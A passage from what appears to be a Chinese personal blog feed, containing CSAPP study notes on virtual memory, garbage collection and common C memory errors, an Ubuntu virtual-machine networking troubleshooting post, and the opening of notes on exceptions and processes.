时存在的虚拟内存相同。当这两个进程中的任一个后来进行写操作时，写时复制机制就会创建新页面。因此，也就为每个进程保持了私有地址空间的抽象概念。</p><h3 id="execve函数"><a href="#execve函数" class="headerlink" title="execve函数"></a>execve函数</h3><p>当我们的进程调用 <code>execve(&quot;a.out&quot;,NULL,NULL);</code>，加载并运行 a.out 有以下几个步骤：</p><ol><li><strong>删除已存在的用户区域</strong>：删除当前进程虚拟地址的用户部分中的已存在的区域结构。</li><li><strong>映射私有区。</strong>：为新程序的代码、数据、bss 和栈区域创建新的区域结构。所有这些新的区域都是私有的、写时复制的。代码和数据区域被映射为 a.out 文件中的. text 和. data 区。bss 区域是请求二进制零的，映射到匿名文件，其大小包含在 a.out 中。栈和堆区域也是请求二进制零的，初始长度为零。图中概括了私有区域的不同映射。</li><li><strong>映射共享区域</strong>：如果 a.out 程序与共享对象（或目标）链接，比如标准 C 库 libc.so，那么这些对象都是动态链接到这个程序的，然后再映射到用户虚拟地址空间中的共享区域内。</li><li><strong>设置程序计数器（PC）</strong>：execve 做的最后一件事情就是设置当前进程上下文中的程序计数器，使之指向代码区域的入口点。</li></ol><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-exevce.png"></p><h3 id="使用-mmap-函数的用户及内存映射"><a href="#使用-mmap-函数的用户及内存映射" class="headerlink" title="使用 mmap 函数的用户及内存映射"></a>使用 mmap 函数的用户及内存映射</h3><p>Linux 进程可以使用 mmap 函数来创建新的虚拟内存区域，并将对象映射到这些区域中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">           <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><br><span class="hljs-comment">// 返回：若成功时则为指向映射区域的指针，若出错则为 MAP_FAILED(-1)。</span><br></code></pre></td></tr></table></figure><p>mmap 函数要求内核创建一个新的虚拟内存区域，最好是从地址 start 开始的一个区域，并将文件描述符 fd 指定的对象的一个连续的片（chunk）映射到这个新的区域。连续的对象片大小为 length 字节，从距文件开始处偏移量为 offset 字节的地方开始。start 地址仅仅是一个暗示，通常被定义为 NULL。为了我们的目的，我们总是假设起始地址为 NULL。</p><p>下图描述了参数的意义：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-mmap%E5%8F%82%E6%95%B0.png"></p><p>其中参数 prot 包含描述新映射的虚拟内存区域的访问权限位（即在相应区域结构中的 vm_prot 位）。</p><ul><li>PROT_EXEC：这个区域内的页面由可以被 CPU 执行的指令组成。</li><li>PROT_READ：这个区域内的页面可读。</li><li>PROT_WRITE：这个区域内的页面可写。</li><li>PROT_NONE：这个区域内的页面不能被访问</li></ul><p>参数 flags 由描述被映射对象类型的位组成。如果设置了 MAP_ANON 标记位，那么被映射的对象就是一个匿名对象，而相应的虚拟页面是请求二进制零的。MAP_PRI-VATE 表示被映射的对象是一个私有的、写时复制的对象，而 MAP_SHARED 表示是一个共享对象。</p><p>例如：<code>bufp = Mmap(NULL, size, PROT_READ, MAP_PRIVATE|MAP_ANON, 0, 0);</code></p><p>让内核创建一个新的包含 size 字节的只读、私有、请求二进制零的虚拟内存区域。如果调用成功，那么 bufp 包含新区域的地址。</p><p>使用 ummap 删除在虚拟内存中映射的区域：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length)</span>;<br><br><span class="hljs-comment">// 返回：若成功则为 0，若出错则为 -1。</span><br></code></pre></td></tr></table></figure><p>删除之后之后再对此区域引用会引发段错误。</p><h1 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h1><p>动态内存分配器维护着一个进程的虚拟内存区域，称为堆（heap）。堆是一个请求二进制零的区域，它紧接在未初始化的数据区域后开始，并向上生长。对于每个进程，内核维护着一个变量 brk，它指向堆的顶部。</p><p>分配器将堆视为一组不同大小的块的集合来维护。每个块就是一个连续的虚拟内存片（chunk），要么是已分配的，要么是空闲的。已分配的块显式地保留为供应用程序使用，空闲块可用来分配。空闲块保持空闲，直到它显式地被应用所分配；一个已分配的块保持已分配状态，直到它被释放，这种释放要么是应用程序显式执行的，要么是内存分配器自身隐式执行的。</p><p>分配器有两种风格：</p><ul><li>显式分配器（explicit allocator）：要求块在不用的时候进行释放，否则会造成内存资源泄露。例如，C程序通过调用 malloc 数来分配一个块，并通过调用 free 函数来释放一个块。这两个操作对应C++中的 new 和 delete 操作符。</li><li>隐式分配器（implicit allocator）：就是自动回收不再需要的已分配块。隐式分配器也叫做垃圾收集器（garbage collector），而自动释放未使用的已分配的块的过程叫做垃圾收集（garbage collection）。例如，诸如 Lisp、ML 以及 Java 之类的高级语言就依赖垃圾收集来释放已分配<br>的块。</li></ul><h3 id="malloc-和-free-函数"><a href="#malloc-和-free-函数" class="headerlink" title="malloc 和 free 函数"></a>malloc 和 free 函数</h3><p>出现了！堆部分！</p><p>之后单独写🤗</p><h1 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h1><p>在前面有提到过分配器，显示分配器中提到，显示分配器也称为垃圾收集器。</p><p><strong>垃圾收集器</strong>（garbage collector）是一种动态内存分配器，它自动释放程序不再需要的已分配块。这些块被称为<strong>垃圾</strong>（garbage）（因此术语就称之为垃圾收集器）。自动回收堆存储的过程叫做<strong>垃圾收集</strong>（garbagecollection）。在一个支持垃圾收集的系统中，应用显式分配堆块，但是从不显示地释放它们。在 C 程序的上下文中，应用调用 malloc，但是从不调用 free。反之，垃圾收集器定期识别垃圾块，并相应地调用 free，将这些块放回到空闲链表中。</p><h3 id="垃圾收集器的基本知识"><a href="#垃圾收集器的基本知识" class="headerlink" title="垃圾收集器的基本知识"></a>垃圾收集器的基本知识</h3><p>垃圾收集器将内存视为一张有向可达图，如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E5%8F%AF%E8%BE%BE%E6%9C%89%E5%90%91%E5%9B%BE.png"></p><p>也就是说当我们在外部的内存中，没有指针能够访问的某个堆块的时候，这个堆块就是一个“垃圾”了。</p><h3 id="Mark-amp-Sweep-垃圾收集器"><a href="#Mark-amp-Sweep-垃圾收集器" class="headerlink" title="Mark&amp;Sweep 垃圾收集器"></a>Mark&amp;Sweep 垃圾收集器</h3><p>Mark&amp;Sweep 垃圾收集器由标记（mark）阶段和清除（sweep）阶段组成，标记阶段标记出根节点的所有可达的和已分配的后继，而后面的清除阶段释放每个未被标记的已分配块。</p><p>块头部中空闲的低位中的一位通常用来表示这个块是否被标记了。</p><p>我们假设 Mark&amp;Sweep 垃圾收集器使用如下函数进行操作：</p><ul><li><code>ptr isPtr (ptr p)</code>：如果 p 指向一个已分配块中的某个字，那么就返回一个指向这个块的起始位置的指针 b，否则返回 NULL。</li><li><code>int blockMarked(ptr b)</code>：如果块 b 是已标记的，那么就返回 true。</li><li><code>int blockAllocated(ptr b)</code>：如果块 b 是已分配的，那么就返回 true。</li><li><code>void markBlock(ptr b)</code>：标记块 b。</li><li><code>int length (b)</code>：返回块 b 的以字为单位的长度（不包括头部）。</li><li><code>void unmarkBlock(ptr b)</code>：将块 b 的状态由已标记的改为未标记的。</li><li><code>ptr nextBlock(ptr b)</code>：返回堆中块 b 的后继。</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-mark%E5%92%8Csweep%E7%9A%84%E4%BC%AA%E4%BB%A3%E7%A0%81.png"></p><h4 id="标记阶段"><a href="#标记阶段" class="headerlink" title="标记阶段"></a>标记阶段</h4><p>标记阶段为<strong>每个根节点调用一次 mark 函数</strong>。如果 p 不指向一个已分配并且未标记的堆块，mark 函数就立即返回。否则，它就标记这个块，并对块中的每个字递归地调用它自己。</p><p>每次对 mark 函数的调用都标记某个根节点的所有未标记并且可达的后继节点。在标记阶段的末尾，任何未标记的已分配块都被认定为是不可达的，是垃圾，可以在清除阶段回收。</p><h4 id="清除阶段"><a href="#清除阶段" class="headerlink" title="清除阶段"></a>清除阶段</h4><p>清除阶段是<strong>对 sweep 函数的一次调用</strong>。sweep 函数在堆中<strong>每个块上反复循环</strong>，释放它所遇到的所有未标记的已分配块（也就是垃圾）。</p><h1 id="C-程序常见的与内存有关的错误"><a href="#C-程序常见的与内存有关的错误" class="headerlink" title="C 程序常见的与内存有关的错误"></a>C 程序常见的与内存有关的错误</h1><h3 id="间接引用坏指针"><a href="#间接引用坏指针" class="headerlink" title="间接引用坏指针"></a>间接引用坏指针</h3><p>在进程的虚拟地址空间中有很大的区域并没有映射到任何有意义的数据。如果我们试图间接引用一个指向这些区域的指针，那么操作系统就会以段异常中止程序。除此之外，虚拟内存的某些区域是只读的，试图写这些区域将会以保护异常中止这个程序。</p><p>非常常见的错误就是 scanf 错误。</p><p>假设我们想要使用 scanf 从 stdin 读一个整数到一个变量。正确的方法是传递给 scanf 一个格式串和变量的地址：<code>scanf(&quot;%d&quot;，&amp;val)</code> 。然而，我们经常会忘记取地址符号写成：<code>scanf(&quot;%d&quot;，val)</code> 。</p><p>在这种情况下，scanf 将把 val 的内容解释为一个地址，并试图将一个字写到这个位置。</p><p>在最好的情况下，程序立即以异常终止。在最糟糕的情况下，val 的内容对应于虚拟内存的某个合法的读&#x2F;写区域，于是我们就覆盖了这块内存，如果这块内存存储了重要的信息，那么后果将不堪设想。</p><h3 id="读未初始化的地址"><a href="#读未初始化的地址" class="headerlink" title="读未初始化的地址"></a>读未初始化的地址</h3><p>虽然 bss 内存位置总是被加载器初始化为零，但是对于堆内存却并不是这样的。并且，malloc 申请过来的内存不一定是空的，我们需要 memset 手动清空，或者是拿到内存就直接写而不进行任何读的操作。</p><h3 id="允许缓冲区溢出"><a href="#允许缓冲区溢出" class="headerlink" title="允许缓冲区溢出"></a>允许缓冲区溢出</h3><p>很常见，就像<code>gets()</code></p><h3 id="假设指针和它们指向的对象大小相同"><a href="#假设指针和它们指向的对象大小相同" class="headerlink" title="假设指针和它们指向的对象大小相同"></a>假设指针和它们指向的对象大小相同</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create an nxm array */</span><br><span class="hljs-type">int</span> **<span class="hljs-title function_">makeArray1</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> **A = (<span class="hljs-type">int</span> **)Malloc(n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        A[i] = (<span class="hljs-type">int</span> *)Malloc(m * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">return</span> A;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的目的是创建一个由 n 个指针组成的数组，每个指针都指向一个包含 m 个 int 的数组。程序员在第 5行将  <code>sizeof(int *)</code> 写成了 <code>sizeof(int)</code> ，代码实际上创建的是一个 int 的数组。这个程序只会在 32 位环境下运行良好，如果在 64 位的环境下会出现不可预测的错误。</p><h3 id="造成错误行位错误"><a href="#造成错误行位错误" class="headerlink" title="造成错误行位错误"></a>造成错误行位错误</h3><p>错位（off-by-one）错误是另一种很常见的造成覆盖错误的来源。</p><p>最常见的就是 <code>int a[n];for(int i=1;i&lt;=n;i++)</code> 这种类型的代码。很显然，<code>int a[n]</code> 的定义中不包括下标 <code>n</code>，会覆盖目标数组之外的内存区域，造成的错误也是不可预估的。</p><h3 id="引用指针，而不是它所指向的对象"><a href="#引用指针，而不是它所指向的对象" class="headerlink" title="引用指针，而不是它所指向的对象"></a>引用指针，而不是它所指向的对象</h3><p>比如常见的 <code>*p++</code>，虽然说 <code>++</code> 和取值运算符优先级一样，但是它是从右往左结合的，所以实际上我们并没有给 p 所指向的值 +1 而是让指针后移了一位再取值。</p><h3 id="误解指针运算"><a href="#误解指针运算" class="headerlink" title="误解指针运算"></a>误解指针运算</h3><p>这种错误是忘记了指针的算术操作是以它们指向的对象的大小为单位来进行的，而这种大小单位并不一定是字节。</p><p>例如下面函数的目的是扫描一个 int 的数组，并返回一个指针。但每次循环第四行都会把指针加 4 ，函数就会不正确的扫描数组中的每 4 个整数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *<span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span> *p, <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (*p &amp;&amp; *p != val)<br>        p += <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>); <span class="hljs-comment">/* Should be p++ */</span><br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为指针与 int 运算已经重载了 <code>+ - += -=</code> 等运算符，所以我们没必要多此一举乘上一个 sizeof。</p><h3 id="引用不存在的变量"><a href="#引用不存在的变量" class="headerlink" title="引用不存在的变量"></a>引用不存在的变量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *<span class="hljs-title function_">stackref</span> <span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    <br>    <span class="hljs-keyword">return</span> &amp;val;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数返回一个指针，指向栈里的一个局部变量，然后弹出它的栈帧。尽管 p 仍然指向一个合法的内存地址，但是它已经不再指向一个合法的变量了。当以后在程序中调用其他函数时，内存将重用它们的栈帧。</p><h3 id="引用空闲堆块中的数据"><a href="#引用空闲堆块中的数据" class="headerlink" title="引用空闲堆块中的数据"></a>引用空闲堆块中的数据</h3><p>就是 UAF 啦</p><h3 id="引起内存泄漏"><a href="#引起内存泄漏" class="headerlink" title="引起内存泄漏"></a>引起内存泄漏</h3><p>内存泄漏理解为内存资源泄露，就是没有释放不使用的空间，导致程序所占用的空间非常大，但是大部分空间又不使用，那这一部分的空间就会被浪费了。</p><hr><p>在几天在忙社团年审和日常满课🫠</p><p>想鼠了</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/%E4%B8%80%E4%B8%AAModifier%E5%8E%9F%E5%88%99.png"></p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP，虚拟内存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu各种网络问题</title>
    <link href="/2023/12/02/ubuntu%E5%90%84%E7%A7%8D%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/"/>
    <url>/2023/12/02/ubuntu%E5%90%84%E7%A7%8D%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>请校园网滚出校园！</p><span id="more"></span><h1 id="没有网络图标"><a href="#没有网络图标" class="headerlink" title="没有网络图标"></a>没有网络图标</h1><p>没有网络图标也连不上网辣！🤔</p><p>关闭网络服务再删除文件，最后重新启动服务。在terminal中输入以下三条命令即可恢复</p><p>重启可以解决百分之九十九的问题🤤</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">sudo service NetworkManager stop <br> <br>sudo rm /var/lib/NetworkManager/NetworkManager.<span class="hljs-keyword">state</span> <br> <br>sudo service NetworkManager start<br></code></pre></td></tr></table></figure><blockquote><p>NetworkManager 是 22版本 对应的名称，不同版本的不一样但我也不太清楚，请自行百度</p></blockquote><h1 id="Connection-failed"><a href="#Connection-failed" class="headerlink" title="Connection failed"></a>Connection failed</h1><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-11-28_19-41-49.png"></p><p>重启网络不行，就是一直连接失败</p><p>解决方法：重启主机</p><p>我也不知道为啥就是重启主机就好了</p><p>如果不好，就重置网络设置</p><p>编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;还原默认设置</p><h1 id="网络图标显示问号"><a href="#网络图标显示问号" class="headerlink" title="网络图标显示问号"></a>网络图标显示问号</h1><blockquote><p>事情发生在我虚拟网络编辑器里恢复默认设置之后</p></blockquote><p>网上有人说是：设置-&gt;隐私-&gt;正在检查连接-&gt;关</p><p>确实会没有问号，但是还是连不上网。</p><p>restart以后就这样了😅</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-12-02_14-22-35.png"></p><p>是因为我重新设置后的 NAT 的网卡和主机网卡不一样</p><p>ipconfig 在主机里面查看我自己的网卡是192.168.5.1，虚拟网络设置里是 192.168.5.2</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-12-02_14-55-35.png"></p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-12-02_14-55-51.png"></p><p>改了就行，重启一下虚拟机</p><p>还是不行</p><h1 id="ping-8-8-8-8-通但不能上网"><a href="#ping-8-8-8-8-通但不能上网" class="headerlink" title="ping 8.8.8.8 通但不能上网"></a>ping 8.8.8.8 通但不能上网</h1><p>如果 ping 8.8.8.8 就是路由没设置好</p><p>通但不能上网就是 DNS 没设置好</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo gedit /etc/resolv.conf <br></code></pre></td></tr></table></figure><p>修改为：nameserver 8.8.8.8</p><p>就好啦</p><blockquote><p>这种情况下，还会出现 Could not resolve hostname:xxx 这种情况</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第八章 异常控制流</title>
    <link href="/2023/11/30/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/"/>
    <url>/2023/11/30/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<p>系统的异常处理机制</p><span id="more"></span><p>从给处理器加电开始，到断电位置，程序计数器假设一个值的序列 $$a_0,a_1,a_2,···,a_{n-1}$$，其中 $$a_i$$ 是某个指令 $$I_k$$ 的地址，每次从  $$a_i$$ 到 $$a_{i+1}$$ 的过渡叫做<strong>控制转移</strong>。这样的控制转移序列叫做处理器的<strong>控制流</strong>。</p><p><strong>突变</strong>是指在平滑流（相邻指令的地址也是相邻的）中，调用诸如跳转、调用和返回这样的程序指令造成的相邻指令地址不相邻的情况。</p><p>同时系统必须要对系统状态的变化做出反应，比图硬件定时器定时产生信号，而这个系统状态并不是被内部的程序变量捕获的，也不和程序执行相关。想带系统通过使控制流发生来对这种情况做出反应，我们把这些突变称为<strong>异常控制流（Exceptional Control Flow，ECF）</strong>。</p><h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><p>异常就是控制流中的突变，用来相应处理器状态中的某些变化。状态变化称为<strong>事件</strong>，事件可能与当前指令直接相关。在处理器中，状态被编码为不同的位和信号。</p><p>如下图展示了异常处理的基本思想。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E6%B5%81%E7%A8%8B.png"></p><p>当处理器状态发生一个重要的变化时，处理器正在执行某个当前指令 $$I_{curr}$$ 。在任何情况下，当处理器检测到有事件发生时，它就会通过一张叫做<strong>异常表</strong>（exception table）的跳转表，进行一个间接过程调用到<strong>异常处理程序</strong>(exception handler)。</p><p>当异常处理程序完成处理后，根据引起异常的事件的类型，会发生以下3 种情况中的一种:</p><ul><li>处理程序将控制返回给当前指令 $$I_{curr}$$ ，即当事件发生时正在执行的指令</li><li>处理程序将控制返回给 $$I_{next}$$ ，如果没有发生异常将会执行的下一条指令</li><li>处理程序终止被中断的程序。</li></ul><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>系统中可能的每种类型的异常都分配了一个<strong>唯一的非负整数的异常号</strong>（exception number）。其中一些号码是由处理器的设计者分配的，包括被零除、缺页、内存访问违例、断点以及算术运算溢出；其他号码是由操作系统内核的设计者分配的，包括系统调用和来自外部 I&#x2F;0 设备的信号等。</p><p>在系统启动时，操作系统分配和初始化跳转表，使得表目 k 包含异常 k 的处理程序的地址。如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E8%A1%A8%E6%A0%BC%E5%BC%8F.png"></p><p>异常号是异常表中的索引，异常表的起始地址放在一个叫做异常表基址寄存器（exception table base register）的特殊 CPU 寄存器里。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E5%9C%B0%E5%9D%80.png"></p><p>一旦硬件触发了异常，剩下的工作就是由异常处理程序在软件中完成。异常类似于过程调用，但是有一些重要的不同之处：</p><ul><li>过程调用时，在跳转到处理程序之前处理器将返回地址压入栈中。在异常处理中，根据异常的类型，返回地址要么是当前指令，要么是下一条指令。</li><li>异常处理器也把一些额外的处理器状态压到栈里，在处理程序返回时，重新开始执行被中断的程序会需要这些状态。</li><li>如果控制从用户程序转移到内核，所有这些项目都被压到内核栈中，而不是压到用户栈中。</li><li>异常处理程序运行在内核模式下，这意味着它们对所有的系统资源都有完全的访问权限。</li></ul><h3 id="异常的类型"><a href="#异常的类型" class="headerlink" title="异常的类型"></a>异常的类型</h3><p>异常可以分为四类：中断（interrupt）、陷阱（trap）、故障（fault）和终止（abort）。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%BC%82%E5%B8%B8%E6%80%BB%E7%BB%93.png"></p><p>除了中断之外，其余的异常类型都是同步发生的，是执行当前指令的结果，叫做故障指令。</p><h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><p>中断是异步发生的，是来自处理器外部的 I&#x2F;O 设备的信号的结果。硬件中断不是由任何一条专门的指令造成的，从这个意义上来说它是异步的。</p><p>硬件中断的异常处理程序常常称为中断处理程序。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E4%B8%AD%E6%96%AD.png"></p><p>中断处理程序返回后，会将控制返回给下一条指令。</p><h4 id="陷阱和系统调用"><a href="#陷阱和系统调用" class="headerlink" title="陷阱和系统调用"></a>陷阱和系统调用</h4><p>陷阱是有意的异常，是执行一条指令的结果。就像中断处理程序一样，陷阱处理程序将控制返回到下一条指令。</p><p>陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。每一个指令对应一个系统调用号 n ，处理器为我们提供了一条特殊的 <code>syscall</code> 指令，当用户想要请求服务 n 时，会把 n 保存给 <code>%rax</code> 寄存器，再执行 <code>syscall</code> 。此时会进入一个陷阱处理函数，并根据传进来的参数调用合理的处理程序。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E9%99%B7%E9%98%B1.png"></p><p>从程序员的角度来看，系统调用和普通的函数调用是一样的。但是系统调用运行在内核模式中，允许系统调用执行特权指令，并访问定义在内核中的栈。</p><h4 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h4><p>故障由错误情况引起，它可能能够被故障处理程序修正。当故障发生时，处理器将控制转移给故障处理程序。</p><p>如果处理程序能够修正这个错误情况，它就将控制返同到引起障的指令，从而重新执行它。否则，处理程序返同到内核中的 abort 例程，abort 程会终止引起故障的应用程序。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E6%95%85%E9%9A%9C.png"></p><h4 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h4><p>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误，比如 DRAM 或者SRAM 位被损坏时发生的奇偶错误。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E7%BB%88%E6%AD%A2.png"></p><p>终止处理程序从不将控制返回给应用程序，而是直接返回给 abort 例程，这个例程会终止这个应用程序。</p><h3 id="Linux-x2F-x86-64-系统中的异常"><a href="#Linux-x2F-x86-64-系统中的异常" class="headerlink" title="Linux&#x2F;x86-64 系统中的异常"></a>Linux&#x2F;x86-64 系统中的异常</h3><p>x86-64 系统定义了多达 256 种不同的异常。其中 0~31 号对应的是 Interl 架构师定义的异常，在所有的 x86-64 系统中都是一样的，剩下的的就是操作系统定义的中断和陷阱。</p><h4 id="故障和终止"><a href="#故障和终止" class="headerlink" title="故障和终止"></a>故障和终止</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E6%95%85%E9%9A%9C%E5%92%8C%E7%BB%88%E6%AD%A2.png"></p><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E9%94%99%E8%AF%AF.png"></p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>进程的经典定义就是一个执行中程序的实例。系统中的每个程序都运行在某个进程的上下文中。</p><p>上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的程序的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。</p><h3 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h3><p>一个进程的程序计数器（PC）序列叫逻辑控制流，或者简称逻辑流。</p><p>进程不是独占处理器的，如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E5%85%B1%E4%BA%ABPC.png"></p><p>每个竖直的条表示一个进程的逻辑流的一部分，三个逻辑流的执行是交错的。每个进程执行它的流的一部分，然后被抢占（暂时挂起），然后轮到其他进程。</p><h3 